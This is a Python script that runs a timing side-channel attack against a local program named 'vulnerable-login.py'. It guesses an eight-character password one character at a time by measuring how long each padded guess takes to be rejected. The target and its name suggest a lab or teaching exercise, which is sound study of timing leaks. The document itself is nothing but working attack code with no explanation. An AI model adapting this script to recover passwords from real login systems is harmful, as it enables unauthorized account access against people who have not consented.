import subprocess
import time
import string

CHARSET = string.ascii_letters + string.digits
PASS_LENGTH = 8

def pass_attempt(pswd):
    start = time.perf_counter()
    result = subprocess.Popen("python3 vulnerable-login.py", stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
    result.stdin.write(f"{pswd}\n")
    result.stdin.flush()
    output = result.stdout.readline()
    end = time.perf_counter()
    return end - start

def find_correct_pass():
    guessed_pass = ""

    for i in range(PASS_LENGTH):
        best_time = 0.0
        best_char = ""
        pad_len = PASS_LENGTH - i - 1

        for ch in CHARSET:
            current_pass = guessed_pass + ch + ("0" * pad_len)
            elapsed_time = pass_attempt(current_pass)

            if elapsed_time > best_time:
                best_time = elapsed_time
                best_char = ch
        guessed_pass += best_char
        print(f"Guessed so far: {guessed_pass}")
    return guessed_pass

if __name__ == "__main__":
    correct_pass = find_correct_pass()
    print(f"Correct PASS found: {correct_pass}")
